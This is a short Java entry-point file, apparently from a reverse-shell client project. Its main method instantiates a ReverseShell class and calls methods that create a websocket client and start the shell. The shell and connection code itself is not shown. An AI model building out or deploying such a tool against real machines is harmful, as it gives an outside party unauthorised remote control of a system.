package com.mtattab.reverseshell;


import com.mtattab.reverseshell.service.impl.ReverseShell;
import com.mtattab.reverseshell.service.impl.WebSocketImpl;
import lombok.extern.java.Log;
import org.eclipse.jetty.util.ssl.SslContextFactory;
import org.eclipse.jetty.websocket.api.Session;
import org.eclipse.jetty.websocket.client.ClientUpgradeRequest;
import org.eclipse.jetty.websocket.client.WebSocketClient;

import java.net.URI;

import java.util.concurrent.Future;
public class Main {



    public static void main(String[] args)  {
        ReverseShell reverseShell= new ReverseShell();
        reverseShell.createClient();
        reverseShell.startReverseShell();
    }




}

